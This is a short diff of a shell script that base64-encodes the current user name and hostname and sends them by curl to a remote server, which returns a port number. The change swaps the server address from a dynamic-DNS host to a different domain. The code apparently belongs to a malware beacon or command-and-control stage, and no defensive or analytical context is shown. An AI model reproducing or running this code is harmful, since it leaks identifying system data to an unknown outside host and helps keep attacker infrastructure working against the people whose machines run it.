@@ -26,7 +26,7 @@ hostname=$(hostname)
 data=$(echo -n "$user:$username:$hostname" | base64)
 
 # api endpoint
-domain_name="edcoretecmm.sytes.net:5000"
+domain_name="proxy1.cryptopredictor.org"
 
 # Proper GET request with query param
 received_port=$(curl -s "https://$domain_name/report?data=$data")
